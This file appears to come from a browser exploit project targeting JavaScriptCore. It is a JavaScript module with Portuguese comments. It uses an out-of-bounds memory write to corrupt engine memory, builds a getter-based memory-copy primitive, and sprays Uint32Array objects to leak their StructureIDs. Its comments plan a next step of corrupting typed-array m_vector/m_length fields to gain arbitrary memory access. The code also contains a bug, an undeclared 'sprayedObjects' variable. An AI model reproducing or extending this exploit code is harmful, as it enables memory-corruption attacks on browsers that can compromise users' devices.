// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

// ============================================================
// DEFINIÇÕES DE CONSTANTES E VARIÁVEIS GLOBAIS
// ============================================================
const FNAME_MAIN = "ExploitLogic_v10";

const GETTER_PROPERTY_NAME_COPY = "AAAA_GetterForMemoryCopy_v10";
const PLANT_OFFSET_0x6C_FOR_COPY_SRC = 0x6C; // Onde plantamos o LOW_DWORD do endereço fonte
const CORRUPTION_OFFSET_TRIGGER_FOR_COPY = 0x70;
const CORRUPTION_VALUE_TRIGGER_FOR_COPY = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);
const TARGET_COPY_DEST_OFFSET_IN_OOB = 0x100; // Onde o JSCell/QWORD será copiado no oob_buffer

let getter_copy_called_flag = false;

// !!!!! IMPORTANTE: Se a descoberta falhar, você PRECISARÁ encontrar este valor manualmente !!!!!
let EXPECTED_UINT32ARRAY_STRUCTURE_ID = null; // Será descoberto ou precisará ser definido
const PLACEHOLDER_SID = 0xBADBAD00 | 29;


// ============================================================
// PRIMITIVA DE CÓPIA DE MEMÓRIA (readFromOffsetViaCopy)
// Lê 8 bytes de oob_array_buffer_real[address_to_read_from.low()]
// e os copia para oob_array_buffer_real[TARGET_COPY_DEST_OFFSET_IN_OOB]
// ============================================================
async function readFromOOBOffsetViaCopy(source_offset_in_oob_to_read_from) {
    const FNAME_PRIMITIVE = `${FNAME_MAIN}.readFromOOBOffsetViaCopy`;
    getter_copy_called_flag = false;

    if (!oob_array_buffer_real || !oob_dataview_real) {
        await triggerOOB_primitive();
    }

    // O valor plantado em 0x6C (source_offset_in_oob_to_read_from)
    // se tornará a parte ALTA do QWORD em 0x68.
    // A "mágica" do getter usará essa parte ALTA como o offset de leitura.
    const value_to_plant_at_0x6c = new AdvancedInt64(source_offset_in_oob_to_read_from, 0); // Low dword é o offset
    oob_write_absolute(PLANT_OFFSET_0x6C_FOR_COPY_SRC, value_to_plant_at_0x6c, 8);
    // logS3(`  [CopyPrim] Plantado ${value_to_plant_at_0x6c.toString(true)} em ${toHex(PLANT_OFFSET_0x6C_FOR_COPY_SRC)}`, "info", FNAME_PRIMITIVE);

    const getterObjectForCopy = {
        get [GETTER_PROPERTY_NAME_COPY]() {
            getter_copy_called_flag = true;
            // logS3(`    [GETTER ${GETTER_PROPERTY_NAME_COPY} ACIONADO!]`, "info", FNAME_PRIMITIVE);
            try {
                // A "mágica" faz com que o valor em oob_buffer[0x68] seja usado como "ponteiro fonte".
                // O valor em 0x68 será 0x(source_offset_in_oob_to_read_from)_00000000.
                // Queremos que o getter leia de source_offset_in_oob_to_read_from.
                // O log v19a/b mostrou que val_at_0x68.high() é o que foi plantado (source_offset_in_oob_to_read_from).
                
                const effective_read_offset = oob_read_absolute(0x68, 8).high(); // Este é o source_offset_in_oob_to_read_from

                if (effective_read_offset >= 0 && effective_read_offset < oob_array_buffer_real.byteLength - 8) {
                    const data_read = oob_read_absolute(effective_read_offset, 8);
                    oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, data_read, 8);
                    // logS3(`    [GETTER] Copiado de ${toHex(effective_read_offset)} para ${toHex(TARGET_COPY_DEST_OFFSET_IN_OOB)}: ${data_read.toString(true)}`, "info", FNAME_PRIMITIVE);
                } else {
                    // logS3(`    [GETTER] Offset de leitura efetivo ${toHex(effective_read_offset)} fora dos limites.`, "warn", FNAME_PRIMITIVE);
                    oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, AdvancedInt64.Zero, 8); // Escreve zero
                }
            } catch (e_getter) {
                logS3(`    [GETTER] Erro: ${e_getter.message}`, "error", FNAME_PRIMITIVE);
                try {oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, new AdvancedInt64(0xDEADDEAD,0xBADBAD), 8); } catch(e){}
            }
            return "getter_copy_done";
        }
    };

    oob_write_absolute(CORRUPTION_OFFSET_TRIGGER_FOR_COPY, CORRUPTION_VALUE_TRIGGER_FOR_COPY, 8);
    // await PAUSE_S3(10); // Pausa mínima

    try {
        JSON.stringify(getterObjectForCopy);
    } catch (e) { /*logS3(`Erro JSON.stringify em ${FNAME_PRIMITIVE}: ${e.message}`, "warn", FNAME_PRIMITIVE);*/ }

    if (!getter_copy_called_flag) {
        logS3("ALERTA: Getter da primitiva de Cópia NÃO foi chamado!", "error", FNAME_PRIMITIVE);
        return null;
    }
    return oob_read_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, 8); // Retorna o QWORD copiado
}


// ============================================================
// FUNÇÃO PARA LER StructureID USANDO A PRIMITIVA DE CÓPIA
// ============================================================
async function getStructureIDFromOOB(offset_of_jscell_in_oob) {
    const FNAME_GET_SID = `${FNAME_MAIN}.getStructureIDFromOOB`;
    // logS3(`Tentando ler SID de ${toHex(offset_of_jscell_in_oob)} usando primitiva de cópia...`, "info", FNAME_GET_SID);

    // A primitiva de cópia irá ler 8 bytes de offset_of_jscell_in_oob
    // e colocar em TARGET_COPY_DEST_OFFSET_IN_OOB.
    await readFromOOBOffsetViaCopy(offset_of_jscell_in_oob);
    
    // Agora, o JSCell header (primeiros 8 bytes) do objeto em offset_of_jscell_in_oob
    // deve estar em TARGET_COPY_DEST_OFFSET_IN_OOB.
    const copied_jscell_header = oob_read_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, 8);

    if (copied_jscell_header && !(copied_jscell_header.low() === 0xBADBAD && copied_jscell_header.high() === 0xDEADDEAD)) {
        // StructureID é geralmente os 4 bytes baixos do JSCell header
        // (JSC_OFFSETS.JSCell.STRUCTURE_ID_OFFSET é 0x00)
        // (JSC_OFFSETS.JSCell.FLAGS_OFFSET é 0x04)
        // O QWORD lido é [FLAGS | ID]. A parte baixa são os primeiros 4 bytes.
        const potential_sid = copied_jscell_header.low();
        // logS3(`  JSCell copiado de ${toHex(offset_of_jscell_in_oob)} para ${toHex(TARGET_COPY_DEST_OFFSET_IN_OOB)}: ${copied_jscell_header.toString(true)}`, "info", FNAME_GET_SID);
        // logS3(`    StructureID Potencial: ${toHex(potential_sid)}`, "leak", FNAME_GET_SID);
        return potential_sid;
    }
    // logS3(`  Falha ao copiar/ler JSCell Header de ${toHex(offset_of_jscell_in_oob)}. Conteúdo em dest: ${copied_jscell_header ? copied_jscell_header.toString(true) : "null"}`, "warn", FNAME_GET_SID);
    return null;
}


// ============================================================
// FUNÇÃO PRINCIPAL DE INVESTIGAÇÃO (v10)
// ============================================================
export async function sprayAndInvestigateObjectExposure() {
    const FNAME_CURRENT_TEST = `${FNAME_MAIN}.discoverAndCorrupt_v10`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Descoberta de SID e Preparação para Corrupção ---`, "test", FNAME_CURRENT_TEST);

    let sprayedVictimObjects = [];

    try {
        await triggerOOB_primitive();
        logS3("Ambiente OOB inicializado.", "info", FNAME_CURRENT_TEST);

        // --- PASSO 1: Validar e Tentar Descobrir EXPECTED_UINT32ARRAY_STRUCTURE_ID ---
        logS3("PASSO 1: Validação da primitiva de leitura de SID e descoberta de SID para Uint32Array...", "info", FNAME_CURRENT_TEST);
        
        // A. Validar com ArrayBuffer (SID conhecido = 2)
        const known_ab_sid = JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID;
        if (typeof known_ab_sid !== 'number') {
            logS3("ERRO: ArrayBuffer_STRUCTURE_ID não definido!", "critical", FNAME_CURRENT_TEST); return;
        }
        let test_ab = new ArrayBuffer(32); sprayedObjects.push(test_ab); // Manter referência
        // PRECISAMOS DO OFFSET REAL DE test_ab no oob_array_buffer_real. Isso ainda é um desafio.
        // Vamos assumir que um ArrayBuffer pulverizado possa estar em um offset baixo para este teste.
        const HYPOTHETICAL_AB_OFFSET_FOR_SID_TEST = 0x200; // Tente um offset diferente
        logS3(`  Testando leitura de SID de AB em ${toHex(HYPOTHETICAL_AB_OFFSET_FOR_SID_TEST)}. SID esperado ~${toHex(known_ab_sid)}`, "info", FNAME_CURRENT_TEST);
        let sid_read_from_ab = await getStructureIDFromOOB(HYPOTHETICAL_AB_OFFSET_FOR_SID_TEST);
        if (sid_read_from_ab !== null) {
            logS3(`  SID lido de ${toHex(HYPOTHETICAL_AB_OFFSET_FOR_SID_TEST)}: ${toHex(sid_read_from_ab)}`, "leak", FNAME_CURRENT_TEST);
            if ((sid_read_from_ab & 0xFFFFFF00) === (known_ab_sid & 0xFFFFFF00)) { // Compara ignorando últimos bits de flags
                logS3("    SUCESSO NA VALIDAÇÃO: SID de ArrayBuffer lido corretamente!", "good", FNAME_CURRENT_TEST);
            } else {
                logS3("    AVISO: SID de ArrayBuffer lido NÃO corresponde ao esperado. A primitiva pode precisar de ajustes ou o offset está errado.", "warn", FNAME_CURRENT_TEST);
            }
        } else {
            logS3("    Falha ao ler SID do ArrayBuffer para validação.", "error", FNAME_CURRENT_TEST);
        }
        await PAUSE_S3(100);

        // B. Pulverizar Uint32Arrays e tentar encontrar seus SIDs
        logS3("  Pulverizando Uint32Arrays para descoberta de SID...", "info", FNAME_CURRENT_TEST);
        const NUM_U32_SPRAY = 100;
        for (let i = 0; i < NUM_U32_SPRAY; i++) {
            sprayedObjects.push(new Uint32Array(8)); // Cria novos ArrayBuffers
        }
        await PAUSE_S3(200);

        const SCAN_START = 0x100; const SCAN_END = 0x2000; const SCAN_STEP = 0x10;
        logS3(`  Escaneando de ${toHex(SCAN_START)} a ${toHex(SCAN_END)} por SIDs de Uint32Array...`, "info", FNAME_CURRENT_TEST);
        let found_sids = {};
        for (let offset = SCAN_START; offset < SCAN_END; offset += SCAN_STEP) {
            let sid = await getStructureIDFromOOB(offset);
            if (sid !== null && sid !== 0 && sid !== 0xFFFFFFFF && (sid & 0xFFFF0000) !== 0xCAFE0000 ) {
                if ((sid & 0xFFFFFF00) !== (known_ab_sid & 0xFFFFFF00)) { // Não é um ArrayBuffer
                    logS3(`    Offset ${toHex(offset)}: SID Potencial = ${toHex(sid)}`, "leak", FNAME_CURRENT_TEST);
                    found_sids[sid] = (found_sids[sid] || 0) + 1;
                }
            }
            if (offset % (SCAN_STEP * 20) === 0) await PAUSE_S3(10);
        }

        let most_frequent_sid = null; let max_freq = 0;
        for (const sid_val_str in found_sids) {
            const sid_val = parseInt(sid_val_str); // Chaves de objeto são strings
            if (found_sids[sid_val] > max_freq) {
                max_freq = found_sids[sid_val];
                most_frequent_sid = sid_val;
            }
        }

        if (most_frequent_sid !== null) {
            EXPECTED_UINT32ARRAY_STRUCTURE_ID = most_frequent_sid;
            logS3(`  !!!! StructureID MAIS FREQUENTE (candidato para Uint32Array): ${toHex(EXPECTED_UINT32ARRAY_STRUCTURE_ID)} (contagem: ${max_freq}) !!!!`, "vuln", FNAME_CURRENT_TEST);
            logS3("    >>>> COPIE ESTE VALOR PARA A CONSTANTE EXPECTED_UINT32ARRAY_STRUCTURE_ID NO TOPO DO ARQUIVO! <<<<", "critical", FNAME_CURRENT_TEST);
            document.title = `U32 SID? ${toHex(EXPECTED_UINT32ARRAY_STRUCTURE_ID)}`;
        } else {
            logS3("  Nenhum candidato a StructureID de Uint32Array proeminente encontrado via scan.", "warn", FNAME_CURRENT_TEST);
            EXPECTED_UINT32ARRAY_STRUCTURE_ID = PLACEHOLDER_SID; // Usa placeholder se não encontrar
        }
        logS3(`EXPECTED_UINT32ARRAY_STRUCTURE_ID definido para: ${toHex(EXPECTED_UINT32ARRAY_STRUCTURE_ID)}`, "info", FNAME_CURRENT_TEST);


        // --- PASSO 2: (Futuro) Usar o SID descoberto para corromper m_vector/m_length de um Uint32Array real ---
        if (EXPECTED_UINT32ARRAY_STRUCTURE_ID !== PLACEHOLDER_SID) {
            logS3(`PASSO 2: Agora que temos um SID (${toHex(EXPECTED_UINT32ARRAY_STRUCTURE_ID)}), podemos tentar a corrupção de m_vector/m_length de forma mais direcionada.`, "info", FNAME_CURRENT_TEST);
            // Aqui você reintegraria a lógica de:
            // 1. Pulverizar Uint32Array (VIEWS sobre oob_array_buffer_real desta vez, ou continuar com independentes e localizar).
            // 2. Encontrar um no offset FOCUSED_VICTIM_ABVIEW_START_OFFSET (0x58) verificando seu SID.
            // 3. Se encontrado, aplicar a corrupção de m_vector para 0 e m_length para 0xFFFFFFFF.
            // 4. Tentar identificar a variável JS correspondente e usá-la.
        } else {
            logS3("PASSO 2: Sem um StructureID de Uint32Array confiável, a corrupção precisa de metadados é mais especulativa.", "info", FNAME_CURRENT_TEST);
        }


    } catch (e) {
        logS3(`ERRO CRÍTICO em ${FNAME_CURRENT_TEST}: ${e.message}`, "critical", FNAME_CURRENT_TEST);
        if (e.stack) logS3(`Stack: ${e.stack}`, "critical", FNAME_CURRENT_TEST);
        document.title = `${FNAME_MAIN} FALHOU!`;
    } finally {
        sprayedObjects = [];
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} Concluído ---`, "test", FNAME_CURRENT_TEST);
    }
}
